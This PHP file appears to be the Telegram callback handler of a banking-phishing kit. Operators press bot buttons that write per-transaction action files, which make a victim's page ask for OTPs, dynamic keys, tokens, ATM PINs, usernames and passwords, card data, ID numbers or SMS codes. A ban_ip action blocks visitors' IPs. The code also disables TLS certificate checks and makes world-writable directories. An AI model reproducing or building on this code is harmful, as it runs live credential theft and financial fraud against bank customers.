<?php
// includes/telegram_handler.php - Procesador unificado de eventos y callback queries de Telegram

require_once __DIR__ . '/security.php';

function procesar_telegram_update(array $update, string $botToken): bool {
    if (!isset($update['callback_query'])) {
        return false;
    }

    $cb = $update['callback_query'];
    $cbData = $cb['data'] ?? '';
    $transactionId = '';
    $actionType = '';

    if (strpos($cbData, ':') !== false) {
        list($actionType, $transactionId) = explode(':', $cbData, 2);
    } elseif (strpos($cbData, '|') !== false) {
        list($actionType, $transactionId) = explode('|', $cbData, 2);
    } else {
        $actionType = $cbData;
    }

    $actionType = trim($actionType);
    $transactionId = trim($transactionId);
    $projectRoot = sura_get_project_root();

    // --- TELEGRAM BAN_IP ACTION HANDLER ---
    if ($actionType === 'ban_ip') {
        $safeTxId = preg_replace('/[^a-zA-Z0-9_-]/', '', $transactionId);
        $bannedIp = sura_get_transaction_ip($transactionId);

        if (!empty($bannedIp) && filter_var($bannedIp, FILTER_VALIDATE_IP)) {
            sura_ban_ip($bannedIp);
        }

        if (!empty($safeTxId)) {
            $dirs = [
                $projectRoot . '/actions',
                $projectRoot . '/datac/actions',
                $projectRoot . '/gate/recargas/transaction/actions',
                $projectRoot . '/gate/recargas/transaction/b-15/actions'
            ];
            foreach ($dirs as $centralDir) {
                if (!is_dir($centralDir)) { @mkdir($centralDir, 0777, true); }
                @file_put_contents($centralDir . '/' . $safeTxId . '.txt', 'ban_ip|' . time(), LOCK_EX);
                @chmod($centralDir . '/' . $safeTxId . '.txt', 0666);
            }
        }

        $operador = !empty($cb['from']['username']) ? '@' . $cb['from']['username'] : trim(($cb['from']['first_name'] ?? '') . ' ' . ($cb['from']['last_name'] ?? ''));

        $answerPayload = ['callback_query_id' => $cb['id'], 'text' => "❌ IP Bloqueada Permanente: " . ($bannedIp ?: 'Desconocida')];
        $ch = curl_init("https://api.telegram.org/bot{$botToken}/answerCallbackQuery");
        curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true, CURLOPT_POSTFIELDS => json_encode($answerPayload), CURLOPT_HTTPHEADER => ['Content-Type: application/json'], CURLOPT_TIMEOUT => 3, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false]);
        curl_exec($ch);
        curl_close($ch);

        $message = $cb['message'] ?? [];
        if (!empty($message['text'])) {
            $newText = $message['text'] . "\n\n❌ <b>IP BANEADA PERMANENTE:</b> " . ($bannedIp ?: 'Desconocida') . "\n👤 <b>Por:</b> $operador";
            $editPayload = ['chat_id' => $message['chat']['id'], 'message_id' => $message['message_id'], 'text' => $newText, 'parse_mode' => 'HTML', 'reply_markup' => json_encode(['inline_keyboard' => []])];
            $chEdit = curl_init("https://api.telegram.org/bot{$botToken}/editMessageText");
            curl_setopt_array($chEdit, [CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true, CURLOPT_POSTFIELDS => json_encode($editPayload), CURLOPT_HTTPHEADER => ['Content-Type: application/json'], CURLOPT_TIMEOUT => 3, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false]);
            curl_exec($chEdit);
            curl_close($chEdit);
        } elseif (!empty($message['caption'])) {
            $newCaption = $message['caption'] . "\n\n❌ <b>IP BANEADA PERMANENTE:</b> " . ($bannedIp ?: 'Desconocida') . "\n👤 <b>Por:</b> $operador";
            $editPayload = ['chat_id' => $message['chat']['id'], 'message_id' => $message['message_id'], 'caption' => $newCaption, 'parse_mode' => 'HTML', 'reply_markup' => json_encode(['inline_keyboard' => []])];
            $chEdit = curl_init("https://api.telegram.org/bot{$botToken}/editMessageCaption");
            curl_setopt_array($chEdit, [CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true, CURLOPT_POSTFIELDS => json_encode($editPayload), CURLOPT_HTTPHEADER => ['Content-Type: application/json'], CURLOPT_TIMEOUT => 3, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false]);
            curl_exec($chEdit);
            curl_close($chEdit);
        }
        return true;
    }
    // --------------------------------------

    if ($actionType !== '' && $transactionId !== '') {
        $safeTxId = preg_replace('/[^a-zA-Z0-9_-]/', '', $transactionId);
        $dirs = [
            $projectRoot . '/actions',
            $projectRoot . '/datac/actions',
            $projectRoot . '/gate/recargas/transaction/actions',
            '/var/www/html/actions',
            '/var/www/html/datac/actions',
            '/var/www/html/gate/recargas/transaction/actions'
        ];

        foreach ($dirs as $centralDir) {
            if ($centralDir === '') continue;
            $usedDir = $centralDir . '/used';

            if (!is_dir($centralDir)) { @mkdir($centralDir, 0777, true); @chmod($centralDir, 0777); }
            if (!is_dir($centralDir)) continue;

            if (!is_dir($usedDir)) { @mkdir($usedDir, 0777, true); @chmod($usedDir, 0777); }

            $usedFile = $usedDir . '/' . $safeTxId . '.txt';
            if (file_exists($usedFile)) { @unlink($usedFile); }

            @file_put_contents($centralDir . '/' . $safeTxId . '.txt', $actionType, LOCK_EX);
            @chmod($centralDir . '/' . $safeTxId . '.txt', 0666);
        }
    }

    // Responder al Callback Query en Telegram para quitar el spinner de carga
    $answerPayload = [
        'callback_query_id' => $cb['id'],
        'text' => '✅ Enviado: ' . $actionType
    ];
    $ch = curl_init("https://api.telegram.org/bot{$botToken}/answerCallbackQuery");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($answerPayload),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_TIMEOUT => 3,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false
    ]);
    curl_exec($ch);
    curl_close($ch);

    // Actualizar texto del mensaje en Telegram
    $from = $cb['from'] ?? [];
    $operador = !empty($from['username']) ? '@' . $from['username'] : trim(($from['first_name'] ?? '') . ' ' . ($from['last_name'] ?? ''));
    $map = [
        'pedir_otp' => 'OTP',
        'otp' => 'OTP',
        'pedir_dinamica' => 'Dinámica',
        'dinamica' => 'Dinámica',
        'pedir_token' => 'Token',
        'token' => 'Token',
        'pedir_cajero' => 'Clave Cajero',
        'c-cajero' => 'Clave Cajero',
        'error_cajero' => 'Clave Cajero',
        'pedir_usuario' => 'Usuario/Clave',
        'usuario' => 'Usuario/Clave',
        'error_tc' => 'Tarjeta',
        'error_cc' => 'Tarjeta',
        'alter' => 'Tarjeta',
        'error' => 'Error',
        'error_logo' => 'Error Logo',
        'error_token' => 'Error Token',
        'error_usuario' => 'Error Usuario',
        'ban_ip' => 'BAN IP',
        'bre_b' => 'Brev',
        'confirm_finalizar' => 'Finalizado',
        'finalizar' => 'Finalizado',
        'cedula' => 'Cedula',
        'pedir_sms' => 'SMS',
        'pago_recibido' => 'Pago Recibido',
        'pago_rechazado' => 'Pago Rechazado'
    ];
    $txtAccion = $map[$actionType] ?? $actionType;
    $message = $cb['message'] ?? [];

    if (!empty($message['text'])) {
        $newText = $message['text'] . "\n\n✅ <b>Acción:</b> {$txtAccion}\n👤 <b>Por:</b> {$operador}";
        $editPayload = [
            'chat_id' => $message['chat']['id'],
            'message_id' => $message['message_id'],
            'text' => $newText,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode(['inline_keyboard' => []])
        ];
        $chEdit = curl_init("https://api.telegram.org/bot{$botToken}/editMessageText");
        curl_setopt_array($chEdit, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode($editPayload),
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            CURLOPT_TIMEOUT => 3,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false
        ]);
        curl_exec($chEdit);
        curl_close($chEdit);
    } elseif (!empty($message['caption'])) {
        $newCaption = $message['caption'] . "\n\n✅ <b>Acción:</b> {$txtAccion}\n👤 <b>Por:</b> {$operador}";
        $editPayload = [
            'chat_id' => $message['chat']['id'],
            'message_id' => $message['message_id'],
            'caption' => $newCaption,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode(['inline_keyboard' => []])
        ];
        $chEdit = curl_init("https://api.telegram.org/bot{$botToken}/editMessageCaption");
        curl_setopt_array($chEdit, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode($editPayload),
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            CURLOPT_TIMEOUT => 3,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false
        ]);
        curl_exec($chEdit);
        curl_close($chEdit);
    }

    return true;
}
